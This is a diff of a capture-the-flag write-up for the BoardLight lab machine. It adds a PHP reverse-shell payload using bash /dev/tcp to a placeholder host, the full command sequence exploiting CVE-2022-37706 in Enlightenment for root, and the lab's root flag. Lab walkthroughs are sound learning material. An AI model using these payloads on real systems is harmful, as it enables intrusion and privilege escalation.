@@ -20,6 +20,12 @@
 
 [**10. What is the name of the desktop environment installed on Boardlight?**](#task-10)
 
+[**11. What version of Enlightenment is installed on BoardLight?**](#task-11)
+
+[**12. What is the 2022 CVE ID for a vulnerability in Enlightenment versions before 0.25.4 that allows for privilege escalation?**](#task-12)
+
+[**13. Root Flag**](#root-flag)
+
 # Tools Used
 
 - nmap
@@ -29,6 +35,8 @@
 # Skills Used
 
 - Subdomain enumeration
+- OSINT for default credentials
+- CVE Exploitation
 
 # Solutions
 
@@ -106,7 +114,7 @@ This is what I added to the page content in the website I made:
 Be sure to make it properly though lmao, I forgot to make the right changes:
 
 ```
-<?pHp system(\"bash -c 'bash -i >& /dev/tcp/[lhost]/[lport] 0>&1'\"); ?>
+<?pHp system("bash -c 'bash -i >& /dev/tcp/[lhost]/[lport] 0>&1'"); ?>
 ```
 
 Now that that's done though, we FINALLY got a revshell.
@@ -162,4 +170,60 @@ Yep.
 
 ## Task 10
 
-TBC.
+I check the hint and it said that there are binaries associated with it, which means:
+
+**Command:**
+
+```
+find / -perm -4000 2>/dev/null
+```
+
+Just a slight alteration to make up for the fact that we're not searching for binaries that are specifically for _root_.
+
+**Results:**
+
+![image](https://github.com/user-attachments/assets/38c0cbe6-79ca-4522-bed7-82c21a5b320c)
+
+Now, we are finding a desktop environment, and those _linux_ files sure do look like what I'm looking for, so...
+
+**Answer: enlightenment**
+
+## Task 11
+
+![image](https://github.com/user-attachments/assets/a51c1938-4d4c-4c17-9961-b6010e4d1fd1)
+
+Found it right here lmao.
+
+**Answer: 0.23.1**
+
+## Task 12
+
+Time for another google search lmao.
+
+![image](https://github.com/user-attachments/assets/cde8bdda-b706-4e4f-923b-cbc93eee1ef4)
+
+**Answer: CVE-2022-37706**
+
+## Root Flag
+
+This [**github repo**](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/tree/main) by **MaherAzzouzi** actually greatly details how the attack works. Unfortunately, I got lost around the part where he started
+reverse engineering the binary in Ghidra, so I'll just yoink the exploit he left there and use that hehe. Still, nice to come back to to understand the attack more.
+
+**Commands:**
+
+```
+cd tmp
+mkdir -p /tmp/net
+mkdir -p "/dev/../tmp/;/tmp/exploit"
+echo "/bin/sh" > /tmp/exploit
+chmod a+x /tmp/exploit
+/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net
+```
+
+**DO NOTE:** For the last command, use the file path of the _enlightenment_sys_ file. In this machine, the full file path is show above, but for future scenarios, make sure to get the right file path.
+
+**Results:**
+
+![image](https://github.com/user-attachments/assets/2f8db5f7-d787-4023-aa97-3ea73bbf2e1b)
+
+**Answer: c446b05aabccd956f1ca537ad3a6d6c8**
